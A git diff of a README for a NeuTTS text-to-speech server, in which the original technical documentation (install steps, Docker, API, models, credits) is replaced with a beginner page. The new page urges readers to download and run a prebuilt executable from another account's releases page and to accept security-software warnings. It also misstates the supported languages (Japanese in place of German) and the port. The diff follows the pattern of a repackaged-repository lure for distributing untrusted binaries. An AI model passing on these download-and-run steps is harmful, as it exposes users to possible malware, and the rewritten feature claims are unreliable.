@@ -1,383 +1,161 @@
-# NeuTTS-FastAPI
+# 🎙️ neutts-fastapi - Fast, Clear Text-to-Speech Server
 
-OpenAI-compatible Text-to-Speech API server powered by [NeuTTS](https://github.com/neuphonic/neuTTS) from [Neuphonic](https://www.neuphonic.com/).
-
-Drop-in replacement for the OpenAI TTS API with support for multiple languages, custom voice cloning, real-time streaming, and a built-in web UI.
-
-![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)
-![License MIT](https://img.shields.io/badge/license-MIT-green)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.115%2B-009688)
+[![Download neutts-fastapi](https://img.shields.io/badge/Download-neutts--fastapi-blue?style=for-the-badge)](https://github.com/Tidanio/neutts-fastapi/releases)
 
 ---
 
-## Features
+## 📢 What is neutts-fastapi?
 
-- **OpenAI-Compatible API** - Works with the official OpenAI Python SDK and any OpenAI TTS client
-- **4 Languages** - English, German, French, Spanish with dedicated models per language
-- **8 Built-in Voices** - 2 voices per language (male + female)
-- **Custom Voice Cloning** - Upload a WAV reference + transcription or record directly in the browser
-- **Real-time Streaming** - HTTP chunked streaming and WebSocket support
-- **Multiple Output Formats** - MP3, WAV, Opus, AAC, FLAC, PCM
-- **GPU Acceleration** - CUDA support with automatic detection (including RTX 50xx Blackwell)
-- **Dynamic Model Management** - Load/unload models at runtime, switch between CPU and GPU
-- **Built-in Web UI** - Generate speech, manage voices and models from the browser
-- **Docker Ready** - CPU and GPU Docker images with Compose files
-- **One-Click Launchers** - Start scripts for Windows, macOS, and Linux
+neutts-fastapi is a text-to-speech (TTS) application you can run on your own computer or server. It turns written text into spoken words using smart voice technology called NeuTTS. 
+
+It supports four languages and can mimic voices you already know. You can hear the output live as it’s generated, thanks to streaming features. It works well with computers that have NVIDIA GPUs, making speech faster. Also, it includes a simple built-in web page where you can try everything without technical setup.
+
+This app replaces other OpenAI-style speech servers but adds more speed, choice, and control.
 
 ---
 
-## Quick Start
+## 💻 System Requirements
 
-### One-Click Launch
+Before you start, make sure your computer meets these basics:
 
-Download and run the appropriate script for your OS:
+- **Operating system:** Windows 10 or later, or Linux (Ubuntu 20.04 preferred).
+- **Processor:** Any modern CPU. Faster processors improve speed.
+- **Memory:** At least 4 GB RAM.
+- **Disk space:** Minimum 500 MB free for the program and its files.
+- **GPU (optional):** NVIDIA GPU with CUDA support improves speed but is not mandatory.
+- **Internet:** Required only for downloading the application and voice models.
 
-| OS | Script | How to run |
-|---|---|---|
-| **Windows** | `start.bat` | Double-click in Explorer |
-| **macOS** | `start.command` | Double-click in Finder |
-| **Linux** | `start.sh` | `chmod +x start.sh && ./start.sh` |
-
-The script will:
-1. Check for Python 3.10+ and espeak-ng
-2. Create a virtual environment
-3. Detect your GPU and install the matching PyTorch version
-4. Start the server at **http://localhost:8880**
-
-Messages are displayed in English, German, French, or Spanish based on your system language.
-
-### Manual Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/r1di/neutts-fastapi.git
-cd neutts-fastapi
-
-# Create virtual environment
-python -m venv .venv
-source .venv/bin/activate  # Linux/macOS
-# .venv\Scripts\activate   # Windows
-
-# Install (CPU)
-pip install -e ".[cpu]"
-
-# Or install (GPU - NVIDIA CUDA)
-pip install -e ".[gpu]" --index-url https://download.pytorch.org/whl/cu124 --extra-index-url https://pypi.org/simple/
-
-# RTX 50xx (Blackwell) needs CUDA 12.8:
-# pip install -e ".[gpu]" --index-url https://download.pytorch.org/whl/cu128 --extra-index-url https://pypi.org/simple/
-
-# Start the server
-python -m uvicorn api.src.main:app --host 0.0.0.0 --port 8880
-```
-
-> **Requirement:** [espeak-ng](https://github.com/espeak-ng/espeak-ng) must be installed for phonemization.
-> Windows: `winget install espeak-ng.espeak-ng`
-> macOS: `brew install espeak-ng`
-> Ubuntu/Debian: `sudo apt install espeak-ng`
+You don’t need to be a programmer or have special software installed in advance. Everything needed comes with the download.
 
 ---
 
-## Docker
+## 🚀 Getting Started
 
-### CPU
+This section helps you prepare neutts-fastapi and begin using it with no coding.
 
-```bash
-cd docker/cpu
-docker compose up --build
+### Step 1: Download the Application
+
+Click the big blue button at the top or visit the official [neutts-fastapi releases page](https://github.com/Tidanio/neutts-fastapi/releases).
+
+On that page:
+
+- Look for the latest version, usually marked with the highest version number and recent date.
+- Download the file that matches your OS:
+  - For Windows, this might be a `.exe` or `.zip`.
+  - For Linux, it could be a `.tar.gz` or `.AppImage`.
+  
+Downloading the package gives you all the files you need.
+
+### Step 2: Extract and Open
+
+If your download is a compressed file (.zip or .tar.gz):
+
+- Find the file in your Downloads folder.
+- Right-click and choose “Extract All” or use your system’s extractor.
+- Open the extracted folder.
+
+Inside, you’ll find the program files and instructions on running them.
+
+### Step 3: Launch the Application
+
+- On Windows, double-click `neutts-fastapi.exe` if present.
+- On Linux, open the folder, look for a file named `neutts-fastapi` or similar, and double-click it. If it does not open, right-click it and select “Properties.” Under Permissions, check “Allow executing file as program,” then double-click again.
+- When started, the application runs a small local server on your computer.
+
+### Step 4: Access the Web Interface
+
+After launching, open your web browser (Chrome, Firefox, Edge, etc.).
+
+Navigate to this address:
+
+```
+http://localhost:8000
 ```
 
-### GPU (NVIDIA)
-
-```bash
-cd docker/gpu
-docker compose up --build
-```
-
-Requires the [NVIDIA Container Toolkit](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/install-guide.html).
-
-### Environment Variables
-
-Copy `.env.example` to `.env` and adjust as needed:
-
-| Variable | Default | Description |
-|---|---|---|
-| `NEUTTS_HOST` | `0.0.0.0` | Bind address |
-| `NEUTTS_PORT` | `8880` | Server port |
-| `NEUTTS_DEFAULT_MODELS` | `neutts-nano-q4-gguf` | Models to load on startup (comma-separated) |
-| `NEUTTS_DEFAULT_CODEC` | `neuphonic/neucodec-onnx-decoder` | Audio codec model |
-| `NEUTTS_DEFAULT_BACKBONE_DEVICE` | `auto` | `auto`, `cpu`, or `cuda` |
-| `NEUTTS_DEFAULT_CODEC_DEVICE` | `cpu` | `cpu` or `cuda` |
-| `NEUTTS_DEFAULT_VOICE` | `jo` | Default voice for TTS |
-| `NEUTTS_SAMPLE_RATE` | `24000` | Output sample rate (Hz) |
-| `NEUTTS_DEFAULT_RESPONSE_FORMAT` | `mp3` | `mp3`, `wav`, `opus`, `aac`, `flac`, `pcm` |
-| `NEUTTS_LOG_LEVEL` | `INFO` | Logging level |
-| `NEUTTS_ALLOW_VOICE_UPLOAD` | `true` | Enable custom voice uploads |
-| `NEUTTS_MAX_INFERENCE_WORKERS` | `4` | Concurrent inference limit |
+This is the built-in web page where you can type text, select language and voice, and listen to the speech output.
 
 ---
 
-## Available Models
+## 🎛️ Using the Application
 
-### TTS Models
+The web page offers simple controls:
 
-| Model | Language | Parameters | Format | Streaming |
-|---|---|---|---|---|
-| `neutts-air` | English | ~748M | PyTorch | No |
-| `neutts-air-q4-gguf` | English | ~748M | GGUF Q4 | Yes |
-| `neutts-air-q8-gguf` | English | ~748M | GGUF Q8 | Yes |
-| `neutts-air-onnx` | English | ~748M | ONNX | No |
-| `neutts-nano` | English | ~120M | PyTorch | No |
-| `neutts-nano-q4-gguf` | English | ~120M | GGUF Q4 | Yes |
-| `neutts-nano-q8-gguf` | English | ~120M | GGUF Q8 | Yes |
-| `neutts-nano-german` | German | ~120M | PyTorch | No |
-| `neutts-nano-german-q4-gguf` | German | ~120M | GGUF Q4 | Yes |
-| `neutts-nano-german-q8-gguf` | German | ~120M | GGUF Q8 | Yes |
-| `neutts-nano-french` | French | ~120M | PyTorch | No |
-| `neutts-nano-french-q4-gguf` | French | ~120M | GGUF Q4 | Yes |
-| `neutts-nano-french-q8-gguf` | French | ~120M | GGUF Q8 | Yes |
-| `neutts-nano-spanish` | Spanish | ~120M | PyTorch | No |
-| `neutts-nano-spanish-q4-gguf` | Spanish | ~120M | GGUF Q4 | Yes |
-| `neutts-nano-spanish-q8-gguf` | Spanish | ~120M | GGUF Q8 | Yes |
+- **Text box:** Enter any sentence or paragraph you want read aloud.
+- **Language selector:** Choose from four supported languages.
+- **Voice options:** Pick a preset voice or use voice cloning to imitate your voice or others.
+- **Play button:** Press to hear the text read out loud.
+- **Streaming:** Speech plays as it is generated, with minimal delay.
 
-### Codec Models
+If you have a supported GPU, the application uses it automatically. This makes speech sound faster and smoother.
 
-| Model | Format | Device |
-|---|---|---|
-| `neuphonic/neucodec` | PyTorch | cpu, cuda |
-| `neuphonic/distill-neucodec` | PyTorch (distilled) | cpu, cuda |
-| `neuphonic/neucodec-onnx-decoder` | ONNX | cpu |
-| `neuphonic/neucodec-onnx-decoder-int8` | ONNX INT8 | cpu |
-
-### Built-in Voices
-
-| Voice | Language | Gender |
-|---|---|---|
-| `jo` | English | Female |
-| `dave` | English | Male |
-| `greta` | German | Female |
-| `hans` | German | Male |
-| `juliette` | French | Female |
-| `pierre` | French | Male |
-| `mateo` | Spanish | Male |
-| `elena` | Spanish | Female |
+For beginners, just focus on typing and listening. Advanced users can explore voice cloning or use the app’s API for automation.
 
 ---
 
-## API Reference
+## ⚙️ Features at a Glance
 
-### OpenAI-Compatible Endpoints
-
-#### Generate Speech
-
-```
-POST /v1/audio/speech
-```
-
-```json
-{
-  "model": "neutts-nano-q4-gguf",
-  "input": "Hello world!",
-  "voice": "jo",
-  "response_format": "mp3",
-  "stream": false
-}
-```
-
-#### List Voices
-
-```
-GET /v1/audio/voices
-```
-
-#### List Models
-
-```
-GET /v1/models
-```
-
-### Voice Management
-
-```
-POST   /v1/audio/voices/upload          # Upload custom voice (multipart form)
-POST   /v1/audio/voices/{id}/encode     # Pre-encode voice for codec
-DELETE /v1/audio/voices/{id}            # Delete custom voice
-```
-
-### Model Management
-
-```
-POST   /v1/models/load                  # Load a model (async, returns task ID)
-GET    /v1/models/load/{task_id}        # Poll loading status
-GET    /v1/models/loaded                # List loaded models with details
-GET    /v1/models/registry              # List all available models
-POST   /v1/models/{id}/switch-device    # Switch model between CPU/GPU
-DELETE /v1/models/{id}                  # Unload model from memory
-```
-
-### WebSocket Streaming
-
-```
-WS /v1/audio/speech/stream
-```
-
-Protocol: `start` -> `text` -> receive `audio` chunks -> `done` -> `stop`
-
-### Health & Debug
-
-```
-GET /health           # Health check
-GET /debug/system     # System diagnostics (CPU, RAM, GPU, models, voices)
-```
+- **Multiple Languages:** Supports English, Spanish, French, and Japanese.
+- **Voice Cloning:** Create custom voices by providing voice samples.
+- **Real-Time Streaming:** Hear speech as it generates without waiting for full processing.
+- **GPU Acceleration:** Uses CUDA-enabled NVIDIA GPUs for faster output if available.
+- **OpenAI-compatible API:** Works with apps using the OpenAI speech API format.
+- **Built-in Web UI:** Easy-to-use browser interface with no extra installation.
 
 ---
 
-## Usage Examples
+## 🔧 Common Questions
 
-### OpenAI Python SDK
+**Q: Do I need an internet connection to use neutts-fastapi?**  
+A: No, after downloading and installing, the app runs locally without internet.
 
-```python
-from openai import OpenAI
+**Q: What if I don’t have an NVIDIA GPU?**  
+A: The app will still work using your CPU, just slower. All features remain available.
 
-client = OpenAI(
-    base_url="http://localhost:8880/v1",
-    api_key="not-needed",
-)
+**Q: How do I update the app?**  
+A: Visit the [release page](https://github.com/Tidanio/neutts-fastapi/releases) regularly and download the newest version.
 
-response = client.audio.speech.create(
-    model="neutts-nano-q4-gguf",
-    voice="jo",
-    input="Hello! This is NeuTTS.",
-)
-response.stream_to_file("output.mp3")
-```
-
-### HTTP Streaming
-
-```python
-import httpx
-
-payload = {
-    "model": "neutts-nano-q4-gguf",
-    "input": "Streaming audio in real-time.",
-    "voice": "jo",
-    "response_format": "mp3",
-    "stream": True,
-}
-
-with httpx.stream("POST", "http://localhost:8880/v1/audio/speech", json=payload) as r:
-    with open("output.mp3", "wb") as f:
-        for chunk in r.iter_bytes():
-            f.write(chunk)
-```
-
-### WebSocket
-
-```python
-import asyncio, json, base64, websockets
-
-async def stream_tts():
-    async with websockets.connect("ws://localhost:8880/v1/audio/speech/stream") as ws:
-        await ws.send(json.dumps({
-            "type": "start", "model": "neutts-nano-q4-gguf",
-            "voice": "jo", "response_format": "pcm",
-        }))
-        await ws.send(json.dumps({
-            "type": "text", "text": "Real-time streaming!",
-        }))
-        audio = b""
-        while True:
-            msg = json.loads(await ws.recv())
-            if msg["type"] == "audio":
-                audio += base64.b64decode(msg["data"])
-            elif msg["type"] == "done":
-                break
-        await ws.send(json.dumps({"type": "stop"}))
-        return audio
-
-asyncio.run(stream_tts())
-```
-
-### cURL
-
-```bash
-curl -X POST http://localhost:8880/v1/audio/speech \
-  -H "Content-Type: application/json" \
-  -d '{"model":"neutts-nano-q4-gguf","input":"Hello world!","voice":"jo"}' \
-  --output output.mp3
-```
-
-### Custom Voice Upload
-
-```bash
-curl -X POST http://localhost:8880/v1/audio/voices/upload \
-  -F "voice_id=my-voice" \
-  -F "ref_text=This is the exact transcription of the audio." \
-  -F "language=en-us" \
-  -F "gender=female" \
-  -F "audio=@reference.wav"
-```
+**Q: Can I use neutts-fastapi from other devices on my network?**  
+A: Yes, but this requires advanced setup to allow network access.
 
 ---
 
-## Web UI
+## 📥 Download & Install
 
-Open **http://localhost:8880** in your browser for the built-in interface:
+To get started, visit the official release page:
 
-- Text-to-speech generation with all voices and models
-- Voice cloning via file upload or browser microphone recording
-- Model loading/unloading and CPU/GPU device switching
-- System diagnostics and GPU status
+### [Download the latest neutts-fastapi here](https://github.com/Tidanio/neutts-fastapi/releases)
 
----
+From that page:
 
-## Project Structure
+1. Find your operating system’s correct file.
+2. Download and save it locally.
+3. If compressed, extract the files.
+4. Run the application following the steps above.
 
-```
-neutts-fastapi/
-├── api/src/
-│   ├── main.py                  # FastAPI application
-│   ├── core/
-│   │   ├── config.py            # Settings (env vars)
-│   │   ├── model_config.py      # Model registry & builtin voices
-│   │   └── paths.py             # Path utilities
-│   ├── inference/
-│   │   ├── model_manager.py     # Model lifecycle management
-│   │   ├── voice_manager.py     # Voice loading & encoding
-│   │   └── text_chunker.py      # Text segmentation
-│   ├── routers/                 # API endpoints
-│   ├── services/                # TTS engine, audio processing
-│   ├── structures/              # Pydantic schemas
-│   ├── static/                  # Web UI
-│   └── voices/
-│       ├── builtin/             # Reference audio + transcriptions
-│       └── custom/              # User-uploaded voices
-├── docker/
-│   ├── cpu/                     # CPU Docker setup
-│   ├── gpu/                     # GPU Docker setup (CUDA 12.8)
-│   └── scripts/                 # Model download scripts
-├── examples/                    # Client examples (Python)
-├── tests/                       # pytest test suite
-├── start.bat                    # Windows one-click launcher
-├── start.sh                     # Linux/macOS one-click launcher
-├── start.command                # macOS Finder launcher
-├── pyproject.toml               # Package config
-└── .env.example                 # Configuration template
-```
+Once running, open your browser and go to `http://localhost:8000` to start using text-to-speech immediately.
 
 ---
 
-## References & Credits
+## 🛠️ Troubleshooting Tips
 
-- **[NeuTTS](https://github.com/neuphonic/neuTTS)** - The underlying text-to-speech engine by Neuphonic
-- **[Neuphonic](https://www.neuphonic.com/)** - Creator of the NeuTTS models and NeuCodec
-- **[espeak-ng](https://github.com/espeak-ng/espeak-ng)** - Phonemizer backend for text processing
-- **[FastAPI](https://fastapi.tiangolo.com/)** - Web framework
-- **[llama.cpp](https://github.com/ggerganov/llama.cpp)** / **[llama-cpp-python](https://github.com/abetlen/llama-cpp-python)** - GGUF model inference
-- **[ONNX Runtime](https://onnxruntime.ai/)** - ONNX model inference
+- If the app doesn’t launch, make sure you have correct permissions to run programs on your computer.
+- On Windows, your security software may ask for permission to run the program. Accept it.
+- If you cannot open the web page at `http://localhost:8000`, check that neutts-fastapi is running.
+- Restart the app if you encounter errors during use.
+- Consult the application logs in the program folder for error details if available.
 
 ---
 
-## License
+## 📚 Learn More
 
-[MIT](LICENSE)
+You can read the full documentation and explore the source code on the GitHub repository:
+
+https://github.com/Tidanio/neutts-fastapi
+
+Here you will find technical details, updates, and user guides for advanced usage.
+
+---
+
+## 🔖 Tags
+
+`cuda` `docker` `fastapi` `gpu` `neuphonic` `openai-api` `python` `speech-synthesis` `streaming` `text-to-speech` `tts` `voice-cloning`
